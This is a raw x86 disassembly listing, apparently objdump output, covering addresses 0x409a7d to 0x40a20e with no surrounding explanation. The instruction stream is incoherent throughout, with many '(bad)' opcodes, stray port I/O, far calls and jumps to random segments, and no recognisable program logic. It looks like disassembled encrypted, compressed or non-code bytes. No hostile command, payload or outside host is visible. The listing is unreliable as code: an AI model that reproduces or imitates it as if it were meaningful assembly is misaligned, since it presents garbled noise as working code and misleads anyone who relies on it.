  409a7d:	sbb    ebp,DWORD PTR [ecx+ecx*4-0xf43da1b]
  409a84:	mov    ds:0x85f84634,eax
  409a89:	(bad)  [edi-0x6c]
  409a8c:	xor    DWORD PTR [ebp-0x5c8aa06f],esi
  409a92:	aad    0xe2
  409a94:	das    
  409a95:	test   eax,0xe6e46c0a
  409a9a:	loope  0x409b0d
  409a9c:	pop    edi
  409a9d:	adc    bl,bl
  409a9f:	fistp  WORD PTR [eax]
  409aa1:	xchg   edi,eax
  409aa2:	out    0x96,al
  409aa4:	xor    eax,0xc3b831ca
  409aa9:	or     eax,DWORD PTR [esi-0x332b9b6]
  409aaf:	ret    0x5147
  409ab2:	adc    BYTE PTR [ebx],dl
  409ab4:	pop    edx
  409ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ab6:	icebp  
  409ab7:	in     al,0x8a
  409ab9:	fldcw  WORD PTR [edx+0x250e3f8d]
  409abf:	pop    ecx
  409ac0:	pusha  
  409ac1:	leave  
  409ac2:	dec    esp
  409ac3:	(bad)  
  409ac4:	popf   
  409ac5:	jo     0x409b20
  409ac7:	xor    dh,al
  409ac9:	sub    eax,0xf03bbb3b
  409ace:	xchg   ebp,eax
  409acf:	inc    ebx
  409ad0:	mov    dl,0xf6
  409ad2:	pop    esp
  409ad3:	mov    DWORD PTR [esi+0x76],ecx
  409ad6:	add    DWORD PTR [edx-0x20],0x30c39e6f
  409add:	pop    edx
  409ade:	pop    edi
  409adf:	pushf  
  409ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ae1:	repnz imul edi,DWORD PTR [ecx-0x58903554],0xfffffff2
  409ae9:	xchg   DWORD PTR [eax],ecx
  409aeb:	ss push edi
  409aed:	test   al,0x7
  409aef:	cmp    eax,0xd7ea77c0
  409af4:	test   al,0x3b
  409af6:	add    bl,al
  409af8:	push   0x25a0bbb8
  409afd:	sub    bh,dh
  409aff:	mov    al,0xc7
  409b01:	pushf  
  409b02:	sbb    BYTE PTR [ebp-0x42],cl
  409b05:	bound  esp,QWORD PTR [ecx]
  409b07:	or     BYTE PTR [edx+0x2aaeb2ee],ah
  409b0d:	adc    eax,DWORD PTR [esi+0x27c34a75]
  409b13:	mov    ch,0xc1
  409b15:	es mov ebx,0xa29f740d
  409b1b:	lods   eax,DWORD PTR ds:[esi]
  409b1c:	xchg   edi,eax
  409b1d:	and    BYTE PTR [ecx],al
  409b1f:	ins    DWORD PTR es:[edi],dx
  409b20:	xchg   ebp,eax
  409b21:	mov    ah,0xa
  409b23:	mov    dl,0xa8
  409b25:	mov    ebx,0xc81a701c
  409b2a:	fld    TBYTE PTR [edi+edx*4-0x45]
  409b2e:	xor    bl,ah
  409b30:	xor    BYTE PTR [esi+0x75],bh
  409b33:	test   al,0x33
  409b35:	hlt    
  409b36:	sub    DWORD PTR [ecx-0x2f],ebx
  409b39:	adc    DWORD PTR [ecx],edx
  409b3b:	test   eax,0x1624d597
  409b40:	jne    0x409bb3
  409b42:	cmp    ch,BYTE PTR [edi+0x2ddc0282]
  409b48:	sbb    bl,BYTE PTR [ebp-0x6bab43b7]
  409b4e:	mov    al,ds:0x26403ea9
  409b53:	mov    eax,0x1e3a12dc
  409b58:	shl    DWORD PTR [ecx+eiz*8],cl
  409b5b:	mov    BYTE PTR [ebp-0x29],ah
  409b5e:	(bad)  
  409b60:	loope  0x409bc1
  409b62:	adc    DWORD PTR [ebx+edx*8],0xffffffa6
  409b66:	fistp  WORD PTR [esi]
  409b68:	rcl    DWORD PTR [ebp-0x3f5eca66],1
  409b6e:	dec    eax
  409b6f:	pop    es
  409b70:	dec    esi
  409b71:	pop    esi
  409b72:	cs push ebx
  409b74:	adc    al,ch
  409b76:	stc    
  409b77:	or     bl,BYTE PTR [ebp+esi*1+0x1f3531ab]
  409b7e:	call   0xa93a:0x5ee0efeb
  409b85:	shr    DWORD PTR [edi+0x2dbb8997],1
  409b8b:	or     eax,0x828f807d
  409b90:	aas    
  409b91:	jl     0x409bdb
  409b93:	push   edi
  409b94:	arpl   si,bx
  409b96:	cmp    eax,0x547f222c
  409b9b:	adc    DWORD PTR [edx],ebp
  409b9d:	popa   
  409b9e:	pop    edi
  409b9f:	ds xchg ecx,edx
  409ba2:	popa   
  409ba3:	popf   
  409ba4:	leave  
  409ba5:	loope  0x409b7f
  409ba7:	pushf  
  409ba8:	mov    ds:0x1e657ee3,eax
  409bad:	xchg   bl,dl
  409baf:	fmul   QWORD PTR [edx+0x45d9e668]
  409bb5:	add    dh,0xe7
  409bb8:	push   edi
  409bb9:	cmp    eax,0xb4e3f8a7
  409bbe:	mov    bh,0xad
  409bc0:	enter  0xa5d3,0x2f
  409bc4:	aam    0x4e
  409bc6:	test   eax,0x42a91d80
  409bcb:	fnsave [edi+esi*8-0xd7dea17]
  409bd2:	fs pop esp
  409bd4:	test   al,0x63
  409bd6:	cs mov edi,ebx
  409bd9:	stos   BYTE PTR es:[edi],al
  409bda:	int3   
  409bdb:	jo     0x409c41
  409bdd:	xor    BYTE PTR [eax+0x4642b284],bh
  409be3:	mov    ds:0x82191484,al
  409be8:	ins    DWORD PTR es:[edi],dx
  409be9:	dec    ebx
  409beb:	sub    eax,ebx
  409bed:	ror    BYTE PTR [esi-0xc],0xb0
  409bf1:	xchg   DWORD PTR [edi+ebx*1-0x18],eax
  409bf5:	ficom  DWORD PTR [ebp+0x645a7531]
  409bfb:	loop   0x409c33
  409bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfe:	lahf   
  409bff:	add    bh,dl
  409c01:	fldenv [esi+0x6e85e18]
  409c07:	clc    
  409c08:	(bad)  
  409c09:	pop    edx
  409c0a:	out    0xd2,eax
  409c0c:	or     BYTE PTR [ecx-0x5fc14701],ah
  409c12:	pusha  
  409c13:	add    BYTE PTR [edi+0xb],bh
  409c16:	aad    0x17
  409c18:	icebp  
  409c19:	aaa    
  409c1a:	inc    eax
  409c1b:	(bad)  
  409c1c:	jp     0x409c20
  409c1e:	mov    dh,BYTE PTR gs:[esi+0x37fd79b9]
  409c25:	jo     0x409bf7
  409c27:	enter  0x9060,0x57
  409c2b:	sbb    eax,0x5906429a
  409c30:	ins    BYTE PTR es:[edi],dx
  409c31:	add    bh,0x44
  409c34:	in     eax,dx
  409c35:	sbb    al,ah
  409c37:	retf   0x3a2c
  409c3a:	push   ebx
  409c3b:	or     DWORD PTR [edx],0xa50c4fd9
  409c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c42:	jb     0x409c4a
  409c44:	leave  
  409c45:	out    dx,al
  409c46:	xchg   BYTE PTR [edx+ecx*1-0x2dc092bc],ah
  409c4d:	push   edi
  409c4e:	nop
  409c4f:	adc    eax,0x6880ba06
  409c54:	push   edx
  409c55:	iret   
  409c56:	jnp    0x409cd3
  409c58:	xchg   esp,eax
  409c59:	in     al,0xfa
  409c5b:	loopne 0x409cbe
  409c5d:	shl    BYTE PTR fs:[edx-0x76],1
  409c61:	pop    edx
  409c62:	test   esp,edi
  409c64:	and    DWORD PTR [ecx+0x51c23ec],edi
  409c6a:	fidivr DWORD PTR [edx+0x30]
  409c6d:	ins    DWORD PTR es:[edi],dx
  409c6e:	xchg   ebx,eax
  409c6f:	or     BYTE PTR [edi-0x1fbd2e74],ah
  409c75:	retf   0xff5b
  409c78:	and    DWORD PTR [ebp+0x20],ecx
  409c7b:	mov    edi,0x2ec229b3
  409c80:	gs repnz mov ch,0xa5
  409c84:	pop    ds
  409c85:	xchg   ecx,eax
  409c86:	jae    0x409ced
  409c88:	shr    DWORD PTR [ecx],1
  409c8a:	xchg   edi,eax
  409c8b:	and    edx,edi
  409c8d:	out    0xb3,eax
  409c8f:	pop    DWORD PTR [ebx+0x6f]
  409c92:	(bad)  
  409c93:	cmp    bh,al
  409c95:	cs (bad) 
  409c97:	pop    ecx
  409c98:	xlat   BYTE PTR ds:[ebx]
  409c99:	or     eax,0x3a459de5
  409c9e:	xlat   BYTE PTR ds:[ebx]
  409c9f:	lock icebp 
  409ca1:	push   ebp
  409ca2:	dec    eax
  409ca3:	loope  0x409c6d
  409ca5:	gs data16 cmc 
  409ca8:	fisubr DWORD PTR [ecx-0x4b]
  409cab:	mov    eax,ds:0x5745ce40
  409cb0:	test   eax,0x48d97113
  409cb5:	add    bl,BYTE PTR [eax+edi*4]
  409cb8:	jecxz  0x409c92
  409cba:	(bad)  
  409cbb:	ss das 
  409cbd:	(bad)  
  409cbe:	sbb    al,0x64
  409cc0:	jb     0x409c6d
  409cc2:	fdiv   QWORD PTR [ebp-0x7]
  409cc5:	ret    
  409cc6:	jge    0x409ceb
  409cc8:	mov    ds:0xc139d8b8,al
  409ccd:	xor    DWORD PTR [ecx+ebp*4],ebp
  409cd0:	pop    ss
  409cd1:	ss stos DWORD PTR es:[edi],eax
  409cd3:	rcl    BYTE PTR [ebx+0xc2b3632],0xf5
  409cda:	mov    eax,ds:0x6e04504b
  409cdf:	out    0xfc,al
  409ce1:	xor    edx,ecx
  409ce3:	addr16 call 0xc08:0x23bd7f66
  409ceb:	jns    0x409d21
  409ced:	dec    eax
  409cee:	jg     0x409c70
  409cf0:	aas    
  409cf1:	outs   dx,DWORD PTR ds:[esi]
  409cf2:	push   ebp
  409cf3:	push   cs
  409cf4:	pop    ss
  409cf5:	jp     0x409c83
  409cf7:	pop    edx
  409cf8:	and    cl,BYTE PTR [eax]
  409cfa:	jmp    0x409cce
  409cfc:	hlt    
  409cfd:	sti    
  409cfe:	das    
  409cff:	push   esi
  409d00:	dec    esi
  409d01:	aaa    
  409d02:	js     0x409cbb
  409d04:	or     al,0x32
  409d06:	mov    DWORD PTR [edi+edx*8],eax
  409d09:	data16 daa 
  409d0b:	scas   eax,DWORD PTR es:[edi]
  409d0c:	fs popa 
  409d0e:	and    edi,eax
  409d10:	xchg   edi,eax
  409d11:	push   ss
  409d12:	cmp    ah,BYTE PTR [ebx-0xb5fea24]
  409d18:	push   ds
  409d19:	or     edi,DWORD PTR [ecx+0x5d]
  409d1c:	imul   edx,DWORD PTR [edx+0x4a1bd256],0xffffffb5
  409d23:	or     edx,DWORD PTR [esi-0x57]
  409d26:	mov    ah,0x11
  409d28:	mul    BYTE PTR [ecx+0x7b]
  409d2b:	je     0x409cf3
  409d2d:	xor    eax,0xf61f8465
  409d32:	pop    edx
  409d33:	pop    ss
  409d34:	cld    
  409d35:	xor    ebx,DWORD PTR [edi]
  409d37:	test   BYTE PTR [edx],bl
  409d39:	xor    al,0x90
  409d3b:	jo     0x409cd7
  409d3d:	loope  0x409da3
  409d3f:	stos   DWORD PTR es:[edi],eax
  409d40:	push   0xfffffff4
  409d42:	inc    eax
  409d43:	push   esi
  409d44:	rcl    esi,cl
  409d46:	xchg   DWORD PTR [ebx+0x72],edi
  409d49:	xchg   BYTE PTR [ebp-0x3f],dl
  409d4c:	repnz mov esp,0x2e90b786
  409d52:	jne    0x409d19
  409d54:	cmp    eax,ebp
  409d56:	pop    es
  409d57:	adc    BYTE PTR [edi+0x32d1000],ch
  409d5d:	jno    0x409ce8
  409d5f:	xchg   esi,eax
  409d60:	call   0x88baf85a
  409d65:	call   0x233d:0x2d2103ca
  409d6c:	xchg   DWORD PTR [ebx-0x207af43a],ebp
  409d72:	xor    DWORD PTR [ecx-0x3d],ecx
  409d75:	jns    0x409d6a
  409d77:	sub    edx,eax
  409d79:	inc    edx
  409d7a:	je     0x409de2
  409d7c:	mov    eax,0xa19cafa2
  409d81:	aad    0x64
  409d83:	jp     0x409db0
  409d85:	jb     0x409da3
  409d87:	in     eax,dx
  409d88:	(bad)
  409d8c:	inc    ebx
  409d8d:	(bad)  
  409d8e:	xor    BYTE PTR [edi],ch
  409d90:	adc    edx,ebp
  409d92:	mov    ah,0x48
  409d94:	jae    0x8665398b
  409d9a:	push   0x4a
  409d9c:	es jns 0x409dd0
  409d9f:	adc    al,BYTE PTR [eax]
  409da1:	outs   dx,BYTE PTR ds:[esi]
  409da2:	lods   al,BYTE PTR cs:[esi]
  409da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da5:	loop   0x409dd4
  409da7:	mov    cl,0x27
  409da9:	rcl    BYTE PTR [ecx+0x1b5dee28],cl
  409daf:	jge    0x409dda
  409db1:	shr    eax,1
  409db3:	mov    dl,0xf
  409db5:	aas    
  409db6:	mov    ch,0x35
  409db8:	sub    dh,BYTE PTR [eax-0x541a6ed1]
  409dbe:	and    eax,0x3af8cafb
  409dc3:	clc    
  409dc4:	inc    edi
  409dc5:	jmp    0x29be3ffc
  409dca:	scas   eax,DWORD PTR es:[edi]
  409dcb:	mov    eax,ebx
  409dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dce:	push   0xffffff9d
  409dd0:	test   al,0xf8
  409dd2:	add    edi,ebx
  409dd4:	push   ebp
  409dd5:	and    DWORD PTR [edx],0xffffffb8
  409dd8:	add    eax,0x6dd3b79b
  409ddd:	xchg   ebp,ebp
  409ddf:	xlat   BYTE PTR ds:[ebx]
  409de0:	mov    al,ds:0xd3139324
  409de5:	test   BYTE PTR [ecx-0x4],dl
  409de8:	iret   
  409de9:	mov    DWORD PTR [esi-0x44],edx
  409dec:	das    
  409ded:	pusha  
  409dee:	add    eax,0x14f4f207
  409df3:	fisttp WORD PTR [edx]
  409df5:	jle    0x409dd0
  409df7:	cmc    
  409df8:	xor    ebx,DWORD PTR [eax+esi*1+0x70e3bd5d]
  409dff:	inc    esp
  409e00:	push   0xa26635bf
  409e05:	sbb    bh,ch
  409e07:	pop    esp
  409e08:	out    0xdf,al
  409e0a:	mov    al,0xce
  409e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e0d:	sub    BYTE PTR [edx],0x42
  409e10:	imul   esi,DWORD PTR [esi],0xe9e40cfe
  409e16:	cmp    DWORD PTR [esi],ebp
  409e18:	es jo  0x409e3f
  409e1b:	adc    eax,DWORD PTR [esi+0x2]
  409e1e:	fcomp  DWORD PTR ds:0x5955d846
  409e24:	idiv   ch
  409e26:	dec    edx
  409e27:	pop    esi
  409e28:	mov    BYTE PTR [ecx+ebx*8],ah
  409e2b:	test   cl,ah
  409e2d:	jbe    0x409e60
  409e2f:	push   0x2a
  409e31:	jecxz  0x409e6b
  409e33:	inc    edi
  409e34:	sahf   
  409e35:	jns    0x409dbe
  409e37:	cld    
  409e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e39:	dec    edx
  409e3a:	retf   0x5420
  409e3d:	xchg   edx,eax
  409e3e:	mov    edx,0xbd917e68
  409e43:	aam    0x30
  409e45:	retf   
  409e46:	clc    
  409e47:	retf   
  409e48:	xchg   ebx,eax
  409e49:	jg     0x409e23
  409e4b:	mov    ebx,0x5ff8e4a5
  409e50:	jl     0x409dff
  409e52:	mov    ?,WORD PTR [ecx]
  409e54:	scas   eax,DWORD PTR es:[edi]
  409e55:	ds test eax,0x347d865c
  409e5b:	pop    ss
  409e5c:	imul   esi,DWORD PTR [esi-0x73],0x55
  409e60:	fs mov ah,0x59
  409e63:	fsub   DWORD PTR [eax]
  409e65:	push   esi
  409e66:	retf   0xee0c
  409e69:	adc    eax,0xf2f7017e
  409e6e:	pushf  
  409e6f:	aad    0xf3
  409e71:	cmc    
  409e72:	imul   eax,DWORD PTR [edi],0x257b7c83
  409e78:	sbb    eax,0xceb57a9f
  409e7d:	addr16 jg 0x409e23
  409e80:	iret   
  409e81:	jnp    0x409e31
  409e83:	fistp  DWORD PTR [edi-0x6738da37]
  409e89:	xchg   esp,eax
  409e8a:	in     eax,dx
  409e8b:	xor    al,0xa6
  409e8d:	call   DWORD PTR [eax]
  409e8f:	scas   al,BYTE PTR es:[edi]
  409e90:	sub    eax,0x25980da1
  409e95:	std    
  409e96:	dec    esp
  409e97:	xor    eax,0xecddaa8c
  409e9c:	fidivr WORD PTR [bp+di+0x6e96]
  409ea1:	xlat   BYTE PTR ds:[ebx]
  409ea2:	cld    
  409ea3:	popa   
  409ea4:	inc    esi
  409ea5:	pop    ebx
  409ea6:	int3   
  409ea7:	and    al,0x2d
  409ea9:	xchg   DWORD PTR [esi+0x4b],esi
  409eac:	mov    eax,0x469a7b5e
  409eb1:	dec    ebp
  409eb2:	shl    BYTE PTR [edx-0x7b],1
  409eb5:	cmp    cl,BYTE PTR [edi+0x40]
  409eb8:	in     eax,dx
  409eb9:	es leave 
  409ebb:	mov    esp,0x605805e
  409ec0:	mov    al,ds:0x68a83735
  409ec5:	mov    ch,0xf8
  409ec7:	leave  
  409ec8:	push   edx
  409ec9:	(bad)
  409ecc:	inc    ebp
  409ecd:	xchg   edi,eax
  409ece:	in     al,0x99
  409ed0:	aaa    
  409ed1:	std    
  409ed2:	ja     0x409ec1
  409ed4:	cmp    edi,DWORD PTR [ecx+0x361f4b9c]
  409eda:	mov    edi,0x5c90dca9
  409edf:	stos   BYTE PTR es:[edi],al
  409ee0:	mov    dl,0xce
  409ee2:	xchg   ecx,eax
  409ee3:	push   ds
  409ee4:	pop    es
  409ee5:	(bad)  
  409ee6:	push   0xffffffef
  409ee8:	js     0x409ea2
  409eea:	add    dl,ch
  409eec:	pop    ecx
  409eed:	pop    ss
  409eee:	mov    eax,ds:0xbdd38cd8
  409ef3:	jmp    0x25ee:0xd7809b5d
  409efa:	pop    ebp
  409efb:	fild   DWORD PTR [eax-0x80]
  409efe:	retf   0x6fc2
  409f01:	das    
  409f02:	ret    0x9a45
  409f05:	sub    BYTE PTR [esi-0x6d],cl
  409f08:	test   eax,0x2dcf87e6
  409f0d:	(bad)  
  409f0e:	cdq    
  409f0f:	(bad)  
  409f10:	add    eax,0xcd5f9f62
  409f15:	mov    edx,0xe9f29007
  409f1a:	out    dx,eax
  409f1b:	or     dh,0x88
  409f1e:	pusha  
  409f1f:	and    BYTE PTR [eax-0x73ca7fc0],dh
  409f25:	fdiv   st(7),st
  409f27:	std    
  409f28:	ins    BYTE PTR es:[edi],dx
  409f29:	stc    
  409f2a:	cmovo  esi,DWORD PTR [edx-0x60b9d582]
  409f31:	(bad)  
  409f32:	mov    WORD PTR [edx],es
  409f34:	inc    esi
  409f35:	idiv   DWORD PTR [eax+0x3f6743e7]
  409f3b:	icebp  
  409f3c:	or     al,0x50
  409f3e:	mov    al,ds:0x57e30e4a
  409f43:	add    al,bl
  409f45:	and    dl,0xc5
  409f48:	aas    
  409f49:	das    
  409f4a:	add    ecx,ebp
  409f4c:	mov    ah,0x4d
  409f4e:	sbb    cl,BYTE PTR [eax]
  409f50:	mov    esi,DWORD PTR [esp+ebx*4]
  409f53:	cs mov ah,0x2b
  409f56:	mov    DWORD PTR [ecx+0x5d],edi
  409f59:	jle    0x409f64
  409f5b:	frstor [edx+eax*4+0x74]
  409f5f:	imul   bl
  409f61:	retf   0x280
  409f64:	xchg   edx,eax
  409f65:	jmp    0x409f97
  409f67:	inc    ebx
  409f68:	mov    dh,ch
  409f6a:	sub    DWORD PTR [esi-0x46],0x50
  409f6e:	outs   dx,DWORD PTR ds:[esi]
  409f6f:	test   al,0x52
  409f71:	mov    bl,BYTE PTR [esi+ecx*8+0x18]
  409f75:	aaa    
  409f76:	aas    
  409f77:	push   ss
  409f78:	aad    0x76
  409f7a:	jns    0x409f2a
  409f7c:	push   ss
  409f7d:	(bad)  
  409f7f:	lods   eax,DWORD PTR ds:[esi]
  409f80:	add    BYTE PTR [eax-0x7c888fb8],0xe7
  409f87:	mov    bl,0x19
  409f89:	mov    al,0x77
  409f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f8c:	or     DWORD PTR [ebp+0x106f6a5b],esi
  409f92:	jge    0x40a011
  409f94:	mov    eax,ds:0xf7d6f891
  409f99:	retf   
  409f9a:	outs   dx,DWORD PTR ds:[esi]
  409f9b:	pop    esi
  409f9c:	retf   
  409f9d:	mov    cl,BYTE PTR [edi+0x46]
  409fa0:	inc    eax
  409fa1:	stos   DWORD PTR es:[edi],eax
  409fa2:	pop    edi
  409fa3:	int    0x92
  409fa5:	mov    dl,0xd9
  409fa7:	sbb    al,0xb8
  409fa9:	ins    BYTE PTR es:[edi],dx
  409faa:	mov    ah,0xe0
  409fac:	inc    ebp
  409fad:	(bad)  
  409fae:	cli    
  409faf:	in     al,0x75
  409fb1:	pop    esp
  409fb2:	or     al,0x95
  409fb4:	loope  0x409fe3
  409fb6:	jle    0x409f8b
  409fb8:	loope  0x409f3f
  409fba:	inc    edi
  409fbb:	rcr    cl,cl
  409fbd:	jb     0x409f6c
  409fbf:	(bad)  
  409fc0:	in     al,0x6c
  409fc2:	jge    0x409f9b
  409fc4:	xor    al,0xaa
  409fc6:	stos   BYTE PTR es:[edi],al
  409fc7:	stos   BYTE PTR es:[edi],al
  409fc8:	xchg   edi,eax
  409fc9:	push   ebp
  409fca:	or     eax,0x6e352eac
  409fcf:	mov    ch,dh
  409fd1:	cli    
  409fd2:	add    BYTE PTR [edi],ah
  409fd4:	xchg   esp,eax
  409fd5:	xchg   ecx,eax
  409fd6:	(bad)  
  409fd7:	and    al,0xc4
  409fd9:	pop    ecx
  409fda:	mov    ah,0x3
  409fdc:	and    eax,0x5715b84
  409fe1:	je     0x409fed
  409fe3:	ds and eax,0xbfb91667
  409fe9:	inc    edx
  409fea:	push   ebp
  409feb:	sub    edx,esp
  409fed:	popa   
  409fee:	xchg   DWORD PTR [ebx-0x17a4b34b],esi
  409ff4:	or     eax,0xf8e26124
  409ff9:	mov    bl,0x3d
  409ffb:	xor    DWORD PTR [ebx],edi
  409ffd:	lods   eax,DWORD PTR ds:[esi]
  409ffe:	dec    esi
  409fff:	loope  0x409fb0
  40a001:	fsub   DWORD PTR [esi-0x6961e7ed]
  40a007:	mov    bh,BYTE PTR [esi]
  40a009:	mov    ecx,DWORD PTR [eax]
  40a00b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a00c:	mov    edx,0x3b3e4197
  40a011:	mov    esi,0x6d08ddc3
  40a016:	push   es
  40a017:	(bad)  
  40a018:	cwde   
  40a019:	addr16 xchg ecx,eax
  40a01b:	scas   eax,DWORD PTR es:[edi]
  40a01c:	mov    ah,0xae
  40a01e:	ds cmc 
  40a020:	loop   0x409fe3
  40a022:	push   ecx
  40a023:	fisubr DWORD PTR [esi-0x3c72a544]
  40a029:	dec    edi
  40a02a:	jg     0x409fcf
  40a02c:	daa    
  40a02d:	adc    al,0x18
  40a02f:	test   eax,0x1de40019
  40a034:	and    BYTE PTR ss:[esi+0x7b4060e9],0x28
  40a03c:	jecxz  0x40a047
  40a03e:	mov    eax,0xb4772f64
  40a043:	mov    bh,0x8d
  40a045:	(bad)  
  40a046:	adc    DWORD PTR [esi],esi
  40a048:	hlt    
  40a049:	cmp    DWORD PTR [edi-0x53],ebx
  40a04c:	sbb    dl,BYTE PTR [esp+eiz*4+0x53]
  40a050:	dec    ebp
  40a051:	idiv   DWORD PTR [ebx+0x44dff30d]
  40a057:	xor    eax,edx
  40a059:	mov    ecx,0xeb965aa6
  40a05e:	cs add ecx,eax
  40a061:	rcr    ah,1
  40a063:	nop
  40a064:	mov    edx,0xf83eb62c
  40a069:	rcl    BYTE PTR [edx-0x48d9500e],cl
  40a06f:	cmp    edi,DWORD PTR [eax+0x464bc244]
  40a075:	loopne 0x40a082
  40a077:	push   ss
  40a078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a079:	inc    edi
  40a07a:	push   esp
  40a07b:	or     eax,0x2d2da286
  40a080:	push   esp
  40a081:	jmp    0x40a03e
  40a083:	mov    ds:0xadc8e971,al
  40a088:	or     BYTE PTR [edi+0x52eb883c],ch
  40a08e:	fs (bad) 
  40a090:	hlt    
  40a091:	push   ds
  40a092:	mov    eax,ds:0xb163f088
  40a097:	mov    ah,0x99
  40a099:	mov    ecx,0xe6c6b68c
  40a09e:	imul   ebx,DWORD PTR [ebp-0x5dc051a],0x57
  40a0a5:	lahf   
  40a0a6:	out    0xa4,eax
  40a0a8:	ret    
  40a0a9:	fidiv  DWORD PTR [edx+ebx*1+0x25]
  40a0ad:	push   ss
  40a0ae:	sub    ebx,ebp
  40a0b0:	dec    edx
  40a0b1:	mov    eax,0x8a986c63
  40a0b6:	clc    
  40a0b7:	jnp    0x40a069
  40a0b9:	mov    dh,0xd9
  40a0bb:	imul   esp,ecx,0x60a6ee32
  40a0c1:	push   ecx
  40a0c2:	mov    bl,0x34
  40a0c4:	dec    esp
  40a0c5:	adc    bl,dl
  40a0c7:	sbb    al,BYTE PTR [ecx]
  40a0c9:	sbb    eax,0x5e304731
  40a0ce:	adc    eax,0x1a5c5086
  40a0d3:	arpl   WORD PTR [edi-0x34],bp
  40a0d6:	mov    ch,0xb7
  40a0d8:	or     DWORD PTR [esi+0x73],ebx
  40a0db:	out    0x34,al
  40a0dd:	in     al,dx
  40a0de:	dec    DWORD PTR [ebx]
  40a0e0:	xor    esi,edx
  40a0e2:	cld    
  40a0e3:	push   cs
  40a0e4:	fbstp  TBYTE PTR [ebp-0xe]
  40a0e7:	test   DWORD PTR [edx+edi*1],edi
  40a0ea:	in     eax,dx
  40a0eb:	lock (bad) 
  40a0ed:	adc    ah,BYTE PTR [ebp+ebx*8+0xc]
  40a0f1:	lahf   
  40a0f2:	fld    DWORD PTR [ecx-0x2c68bb29]
  40a0f8:	push   ds
  40a0f9:	jecxz  0x40a08b
  40a0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0fc:	adc    al,0xcf
  40a0fe:	test   DWORD PTR [ecx+0x2b14e9df],eax
  40a104:	popa   
  40a105:	xchg   esp,eax
  40a106:	or     BYTE PTR [edi-0x42fbaa82],dl
  40a10c:	xor    DWORD PTR [ecx],edi
  40a10e:	or     al,0x0
  40a110:	les    ebx,FWORD PTR [edx-0x2b098f97]
  40a116:	loope  0x40a0f2
  40a118:	cmp    al,0x92
  40a11a:	xchg   esi,eax
  40a11b:	gs aad 0xf9
  40a11e:	xchg   esp,eax
  40a11f:	stos   DWORD PTR es:[edi],eax
  40a120:	jmp    FWORD PTR [ebp-0x67f8c5e4]
  40a126:	jmp    FWORD PTR [ebx]
  40a128:	mov    al,ds:0xec55bf5c
  40a12d:	inc    ebx
  40a12e:	or     BYTE PTR [esi+edx*4],ch
  40a131:	out    dx,eax
  40a132:	add    ah,al
  40a134:	daa    
  40a135:	xor    al,0xd7
  40a137:	pop    es
  40a138:	pop    edi
  40a139:	popa   
  40a13a:	and    BYTE PTR [ebp+ecx*4-0x41],bh
  40a13e:	add    al,0x8e
  40a140:	pop    edi
  40a141:	mov    cl,0x9
  40a143:	push   0x42477bb8
  40a148:	test   eax,0x228e4bc8
  40a14d:	and    ch,BYTE PTR [ebx+esi*2+0x73]
  40a151:	in     eax,0xd9
  40a153:	sub    bl,dl
  40a155:	cmp    cl,BYTE PTR ds:0x230dc956
  40a15b:	retf   0x5c69
  40a15e:	xchg   ecx,edi
  40a160:	icebp  
  40a161:	xchg   ecx,eax
  40a162:	call   0xc28d1dca
  40a167:	adc    dl,al
  40a169:	pusha  
  40a16a:	inc    esp
  40a16b:	test   DWORD PTR [esi-0x77],edi
  40a16e:	or     esi,DWORD PTR [edx+0x44207956]
  40a174:	daa    
  40a175:	test   BYTE PTR [esi-0x66f723cc],0x76
  40a17c:	add    al,0x1d
  40a17e:	int3   
  40a17f:	cmp    eax,DWORD PTR [ebx-0x3146c76c]
  40a185:	js     0x40a141
  40a187:	stos   BYTE PTR es:[edi],al
  40a188:	and    ch,al
  40a18a:	ret    0xc817
  40a18d:	sub    BYTE PTR [eax-0x353adb2b],ch
  40a193:	sub    DWORD PTR [ebx+0x6b],esi
  40a196:	jno    0x40a129
  40a198:	(bad)  
  40a199:	cli    
  40a19a:	inc    esi
  40a19b:	ret    0x952
  40a19e:	cdq    
  40a19f:	lock xchg esp,eax
  40a1a1:	sub    eax,0xef3b5f3a
  40a1a6:	push   ecx
  40a1a7:	jg     0x40a1fd
  40a1a9:	sub    ecx,DWORD PTR [edi]
  40a1ab:	push   0x6b
  40a1ad:	sbb    DWORD PTR [edx],esp
  40a1af:	adc    eax,0xe37a90df
  40a1b4:	mov    ds:0x9c9b57b3,eax
  40a1b9:	jbe    0x40a1fe
  40a1bb:	dec    edx
  40a1bc:	fcomp  QWORD PTR [esi]
  40a1be:	push   cs
  40a1bf:	(bad)  
  40a1c0:	xor    eax,0x1e6c0b17
  40a1c5:	jmp    0x1b1e7bd9
  40a1ca:	xor    BYTE PTR [ebx],ch
  40a1cc:	in     al,dx
  40a1cd:	out    dx,al
  40a1ce:	push   ds
  40a1cf:	ja     0x40a24e
  40a1d1:	sub    BYTE PTR [edi+eax*2+0x65],bl
  40a1d5:	(bad)  [eax]
  40a1d7:	aaa    
  40a1d8:	sahf   
  40a1d9:	and    dh,BYTE PTR [ecx]
  40a1db:	mov    WORD PTR [edi-0x5c97428e],es
  40a1e1:	daa    
  40a1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e3:	sbb    DWORD PTR [edi],esp
  40a1e5:	jns    0x40a252
  40a1e7:	call   0x718aef02
  40a1ec:	push   ecx
  40a1ed:	les    esi,FWORD PTR [edx+eiz*1+0x35]
  40a1f1:	mov    BYTE PTR [ebx-0x718afbbb],0xa5
  40a1f8:	leave  
  40a1f9:	jl     0x40a261
  40a1fb:	leave  
  40a1fc:	pop    ebp
  40a1fd:	ins    BYTE PTR es:[edi],dx
  40a1fe:	jge    0x40a1f5
  40a200:	xchg   esi,eax
  40a201:	mov    al,ds:0x5ef81738
  40a206:	sbb    DWORD PTR [ebx+0x730a1f9f],ebp
  40a20c:	pop    ecx
  40a20d:	(bad)  
  40a20e:	sub    al,0x90
